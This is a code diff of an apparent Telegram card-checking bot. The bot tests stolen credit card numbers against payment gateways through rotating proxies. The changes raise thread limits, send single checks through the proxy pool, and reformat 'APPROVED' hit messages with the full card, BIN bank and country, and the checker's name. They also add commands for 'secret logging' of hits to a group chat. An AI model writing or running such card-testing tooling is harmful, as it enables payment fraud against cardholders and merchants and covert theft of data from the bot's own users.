@@ -810,7 +810,7 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
 # ============================================================
 #  Processing runner
 # ============================================================
-DEFAULT_THREADS = 5
+DEFAULT_THREADS = 10
 
 
 def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS, gate="auth"):
@@ -842,7 +842,7 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
         detail = result.split(" | ", 1)[1] if " | " in result else result
         return (entry, status, detail, category)
 
-    max_workers = max(1, min(threads, total, 10))
+    max_workers = max(1, min(threads, total, 20))
 
     with ThreadPoolExecutor(max_workers=max_workers) as pool:
         futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
@@ -1208,10 +1208,10 @@ def handle_callback(update):
                 "<code>/proxy</code>  ·  Proxy pool status\n"
                 "<code>/addproxy</code>  ·  Add proxies to pool\n"
                 "<code>/scrapeproxies</code>  ·  Scrape fresh proxies\n"
-                "<code>/rpaysite</code>  ·  Manage Razorpay sites\n"
                 "<code>/authsite</code>  ·  Set /auth site URL\n"
-                "<code>/chr1config</code>  ·  Configure /chr1 gate\n"
-                "<code>/chkapis</code>  ·  Health check all APIs\n\n"
+                "<code>/chkapis</code>  ·  Health check all APIs\n"
+                "<code>/secgcset</code>  ·  Set secret log GC\n"
+                "<code>/gctest</code>  ·  Test secret logging\n\n"
                 f"<i>{DEVELOPER}</i>"
             )
         if chat_id and msg_id:
@@ -2923,7 +2923,8 @@ def handle_update(update):
             send_message(chat_id, f"<b>Checking...</b>\n<code>{cc_input}</code>")
 
             def _single_check():
-                result = process_single_entry(cc_input, [], user_id, gate=gate)
+                proxies_list = list(_global_proxies) if _global_proxies else []
+                result = process_single_entry(cc_input, proxies_list, user_id, gate=gate)
                 r_lower = result.lower()
                 if r_lower.startswith("approved") or r_lower.startswith("charged"):
                     status = "APPROVED"
@@ -2934,14 +2935,54 @@ def handle_update(update):
                 else:
                     status = "DECLINED"
 
-                send_message(chat_id,
-                    f"<b>{status}</b>\n\n"
-                    f"Card: <code>{cc_input}</code>\n"
-                    f"Gate: <code>{gate_label}</code>\n"
-                    f"Result: {result}\n\n"
-                    f"<i>{DEVELOPER}</i>")
+                detail = result.split(" | ", 1)[1] if " | " in result else result
+                elapsed = ""
+                if " | " in detail:
+                    p = detail.rsplit(" | ", 1)
+                    if len(p) == 2:
+                        elapsed = p[1]
 
-                # Notify GC on hit
+                bin6 = cc_input.split("|")[0][:6]
+                name = f"@{username}" if username else str(user_id)
+
+                bin_info = ""
+                try:
+                    bi, _ = bin_lookup(bin6)
+                    if bi:
+                        bin_info = f"{bi.get('brand','?')} - {bi.get('bank','?')} - {bi.get('country','?')} {bi.get('emoji','')}"
+                except Exception:
+                    pass
+
+                if status == "APPROVED":
+                    msg_text = (
+                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
+                        f"[🝂] CARD: <code>{cc_input}</code>\n"
+                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
+                        f"[🝂] STATUS: <b>APPROVED ✅</b>\n"
+                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+                        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
+                        f"[🝂] BIN: <code>{bin_info or bin6}</code>\n"
+                        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
+                        f"[🝂] CHECKED BY: {name}\n\n"
+                        f"<i>{DEVELOPER}</i>"
+                    )
+                else:
+                    status_emoji = "❌" if status == "DECLINED" else "⚠️"
+                    msg_text = (
+                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
+                        f"[🝂] CARD: <code>{cc_input}</code>\n"
+                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
+                        f"[🝂] STATUS: <b>{status} {status_emoji}</b>\n"
+                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+                        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
+                        f"[🝂] BIN: <code>{bin_info or bin6}</code>\n"
+                        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
+                        f"[🝂] CHECKED BY: {name}\n\n"
+                        f"<i>{DEVELOPER}</i>"
+                    )
+
+                send_message(chat_id, msg_text)
+
                 if status == "APPROVED":
                     notify_hit(user_id, username, gate_label, cc_input, result)
 
@@ -3019,13 +3060,25 @@ def handle_update(update):
                     status_text = "ERROR — " + detail
 
                 if status == "APPROVED":
+                    bin6 = entry.split("|")[0][:6] if "|" in entry else entry[:6]
+                    name = f"@{username}" if username else str(user_id)
+                    elapsed_h = ""
+                    if " | " in detail:
+                        p = detail.rsplit(" | ", 1)
+                        if len(p) == 2:
+                            elapsed_h = p[1]
                     send_message(chat_id,
-                        f"<b>HIT</b>\n\n"
-                        f"<code>{entry}</code>\n\n"
-                        f"{detail}\n"
+                        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
+                        f"[🝂] CARD: <code>{entry}</code>\n"
+                        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
+                        f"[🝂] STATUS: <b>APPROVED ✅</b>\n"
+                        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+                        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
+                        f"[🝂] BIN: <code>{bin6}</code>\n"
+                        f"[🝂] TIME TOOK: <code>{elapsed_h}</code>\n"
+                        f"[🝂] CHECKED BY: {name}\n"
                         f"[{idx}/{total}]\n\n"
                         f"<i>{DEVELOPER}</i>")
-                    # Notify GC
                     notify_hit(user_id, username, gate_label, entry, detail)
 
                 now = time.time()
